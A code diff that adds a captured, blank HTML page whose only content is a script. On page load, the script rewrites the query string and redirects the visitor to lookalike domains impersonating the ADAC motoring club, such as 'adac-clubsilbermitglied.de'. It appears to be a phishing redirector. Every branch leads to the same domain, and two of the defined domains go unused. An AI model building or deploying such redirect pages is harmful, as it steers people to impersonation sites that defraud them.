@@ -1,0 +1,48 @@
+<!-- url: https://cscp252.cc/NNR53315786567304261438/c1282492-5b8d-43df-abd7-2e1f10c33970?aa=redacted&amp;trag=17PM0925
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <script>
+    window.onload = function () {
+      const domainGas = "https://adac-silverstatus.de/start/";
+      const domainGasInfo = "https://adac-clubsilbermitglied.de/start/";
+      const domainOther = "https://adac-122.de/start/";
+
+      // Parse the query params
+      const params = new URLSearchParams(window.location.search);
+
+      // Remove adac=1 if present
+      params.delete("adac");
+
+      let baseUrl;
+
+         if (params.has("gas")) {
+            // gas param exists â use gas domain
+            params.delete("gas");
+            params.set("adac", "1");
+            baseUrl = domainGasInfo;
+        } else if (params.has("info")) {
+            // info param exists â use info domain
+            params.delete("info");
+            params.set("adac", "1");
+            baseUrl = domainGasInfo;
+        } else {
+            // neither gas nor info â use other domain
+            baseUrl = domainGasInfo;
+            params.set("adac", "1"); // set adac=1 only when not gas/info
+        }
+
+      // Build redirect URL
+      const redirectUrl = baseUrl + (params.toString() ? "?" + params.toString() : "");
+
+      // Redirect
+      window.location.href = redirectUrl;
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
